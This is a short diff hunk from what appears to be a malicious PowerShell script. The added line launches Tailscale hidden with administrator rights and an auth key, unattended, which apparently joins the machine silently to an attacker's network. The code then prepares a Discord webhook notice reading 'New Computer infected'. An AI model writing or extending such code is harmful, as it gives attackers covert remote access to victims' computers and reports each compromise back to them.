@@ -203,8 +203,9 @@ Set-Location $temp\$dirName
 
 ## Sends Discord Webhook
 # FIXME: Message isn't beeing send
-Start-Process -FilePath 'C:\Tailscale\tailscale.exe' -windowstyle hidden -Verb RunAs -ArgumentList "up --authkey $authKey --unattended"
 Start-Process -FilePath 'C:\Tailscale\tailscale-ipn.exe' 
+Start-Process -FilePath 'C:\Tailscale\tailscale.exe' -windowstyle hidden -Verb RunAs -ArgumentList "up --authkey $authKey --unattended"
+
 
 $description = @"
 New Computer infected 
